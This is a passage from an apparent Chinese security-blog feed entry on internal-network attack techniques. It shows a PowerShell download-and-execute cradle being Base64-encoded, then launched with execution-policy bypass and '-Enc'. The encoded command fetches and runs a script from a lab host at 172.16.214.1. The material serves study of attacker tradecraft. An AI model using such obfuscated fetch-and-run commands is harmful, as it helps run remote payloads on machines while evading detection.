punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&gt;python ps_encoder&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;py &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;s raw&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;使用 –Enc 指定 Base64 编码内容&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PowerShell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Exec Bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
         <category term="安全技术" scheme="http://gsh3ll.top/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" />
         <category term="内网安全" scheme="http://gsh3ll.top/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" />
         <updated>2021-12-18T07:27:41.000Z</updated>
